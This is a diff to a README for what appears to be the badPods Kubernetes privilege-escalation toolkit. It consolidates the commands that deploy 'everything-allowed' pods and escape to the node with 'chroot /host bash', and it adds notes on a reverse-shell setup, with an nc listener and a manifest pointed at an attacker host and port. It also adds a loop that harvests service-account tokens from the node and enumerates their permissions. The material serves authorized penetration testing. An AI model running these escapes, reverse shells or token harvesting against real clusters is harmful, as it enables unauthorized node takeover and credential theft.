@@ -27,55 +27,26 @@ Create one or more of these resource types and exec into the pod
 kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml
 kubectl exec -it everything-allowed-exec-pod -- chroot /host bash
 ```
-**Job**  
+**Job, CronJob, Deployment, StatefulSet, ReplicaSet, ReplicationController, DaemonSet**
+
+Replace [RESOURCE_TYPE] with deployment, statefulset, job, etc. 
+
 ```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/job/everything-allowed-exec-job.yaml 
-kubectl get pods | grep everything-allowed-exec-job      
-kubectl exec -it everything-allowed-exec-job-[ID] -- chroot /host bash
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/[RESOURCE_TYPE]/everything-allowed-exec-[RESOURCE_TYPE].yaml 
+kubectl get pods | grep everything-allowed-exec-[RESOURCE_TYPE]      
+kubectl exec -it everything-allowed-exec-[RESOURCE_TYPE]-[ID] -- bash
 ```
-**CronJob**  
-```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/cronjob/everything-allowed-exec-cronjob.yaml 
-kubectl get pods | grep everything-allowed-exec-cronjob      
-kubectl exec -it everything-allowed-exec-cronjob-ID -- chroot /host bash
-```
-**Deployment**  
-```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/deployment/everything-allowed-exec-deployment.yaml 
-kubectl get pods | grep everything-allowed-exec-deployment        
-kubectl exec -it everything-allowed-exec-deployment-[ID] -- chroot /host bash
-```
-**StatefulSet (This manifest also creates a service)**  
-```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/statefulset/everything-allowed-exec-statefulset.yaml
-kubectl get pods | grep everything-allowed-exec-statefulset
-kubectl exec -it everything-allowed-exec-statefulset-[ID] -- chroot /host bash
-```
-**ReplicaSet**  
-```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/replicaset/everything-allowed-exec-replicaset.yaml
-kubectl get pods | grep everything-allowed-exec-replicaset
-kubectl exec -it everything-allowed-exec-replicaset-[ID] -- chroot /host bash
+
+*Keep in mind that if pod security policy blocks the pod, the resource type will still get created. The admission controller only blocks the pods that are created by the resource type.* 
+
+To troubleshoot a case where you don't see pods, use `kubectl describe`
 
 ```
-**ReplicationController**  
-```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/replicationcontroller/everything-allowed-exec-replicationcontroller.yaml
-kubectl get pods | grep everything-allowed-exec-replicationcontroller
-kubectl exec -it everything-allowed-exec-replicationcontroller-[ID] -- chroot /host bash
-```
-**DaemonSet**  
-```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/daemonset/everything-allowed-exec-daemonset.yaml 
-kubectl get pods | grep everything-allowed-exec-daemonset
-kubectl exec -it everything-allowed-exec-daemonset-[ID] -- chroot /host bash
+kubectl describe everything-allowed-exec-[RESOURCE_TYPE]
 ```
 
 ## Reverse shell pods
 Create one or more of these resources and catch the reverse shell
-
-**Generic resource type creation example**
-Replace [RESOURCE_TYPE] with deployment, statefulset, job, etc. 
 
 **Step 1: Set up listener**
 ```bash
@@ -83,6 +54,10 @@ nc -nvlp 3116
 ```
 
 **Step 2: Create pod from local manifest without modifying it by using env variables and envsubst**
+
+* Replace [RESOURCE_TYPE] with deployment, statefulset, job, etc. 
+* Replace the HOST and PORT values to point the reverse shell to your listener
+  
 ```bash
 HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/everything-allowed/[RESOURCE_TYPE]/everything-allowed-revshell-[RESOURCE_TYPE].yaml | kubectl apply -f -
 ```
@@ -189,7 +164,9 @@ done | sort
 ```
 
 **Run kubectl can-i --list against ALL tokens found on the node**
-Run this where you have kubectl installed
+
+*Run this where you have kubectl installed, and NOT from within the priv pod.* 
+
 ```
 tokens=`kubectl exec -it everything-allowed-exec-pod -- chroot /host find /var/lib/kubelet/pods/ -name token -type l`; \
 for filename in $tokens; \
@@ -200,6 +177,15 @@ echo "What can I do?"; \
 kubectl -v9 --token=$tokena auth can-i --list; echo; \
 done
 ```
+This is what just happened:
+* From outside the pod, you execute `kubectl exec` to find all of the token locations on the host
+* You then iterate through the list of filenames, and
+  * Print the token location
+  * Run `kubectl auth can-i list` using each token via the `--token` command line argument.  
+* This gives you a list of the actions each token can perform cluster wide. 
+  
+The next command will do the same thing, but just in the kube-system namespace. 
+
 
 **Run kubectl can-i --list -n kube-system against ALL tokens found on the node**
 ```
